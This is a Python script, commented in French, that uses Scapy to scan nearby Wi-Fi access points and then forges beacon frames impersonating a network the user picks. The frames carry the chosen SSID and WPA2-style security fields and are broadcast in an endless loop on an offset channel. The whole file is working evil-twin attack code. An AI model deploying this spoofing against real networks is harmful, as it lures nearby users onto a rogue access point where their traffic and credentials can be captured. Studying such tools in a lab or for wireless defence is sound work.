from scapy.all import *
from threading import Thread
import pandas
import time
import os

iface = 'wlan0'         #Interface name here
# fortement inspiré de https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)
isScanning = True
isPrinting = True

def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        networks.loc[bssid] = (ssid, dbm_signal, channel)


def print_all():
    while isPrinting:
        os.system("clear")
        print(networks)
        time.sleep(0.5)


def change_channel():
    ch = 1
    while isScanning:
        os.system(f"iwconfig {iface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)


if __name__ == "__main__":
    # start the thread that prints all the networks
    printer = Thread(target=print_all)
    printer.daemon = True
    printer.start()
    # start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    # start sniffing
    sniff(prn=callback, iface=iface, timeout=10)
    # on arrête de scanner et d'afficher les SSID dispos et on arrête les threads
    isPrinting = False
    isScanning = False
    printer.join()
    channel_changer.join()

    netSSID = input("Entrez le nom du wifi à usurper, il doit correspondre à un wifi existant : ")  # Network name here
    network = networks.loc[networks['SSID'] == netSSID]
    # positionnement 6 channels plus loin
    evilChannel = (network['Channel'] + 6) % 14
    os.system(f"iwconfig {iface} channel {evilChannel[0]}")
# inspiré de https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                  addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=netSSID, len=len(netSSID))
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'  # RSN Version 1
        '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
        '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'  # AES Cipher
        '\x00\x0f\xac\x02'  # TKIP Cipher
        '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'  # Pre-Shared Key
        '\x00\x00'))  # RSN Capabilities (no extra capabilities)

    frame = RadioTap() / dot11 / beacon / essid / rsn

# envoie des trames
    sendp(frame, iface=iface, inter=0.100, loop=1)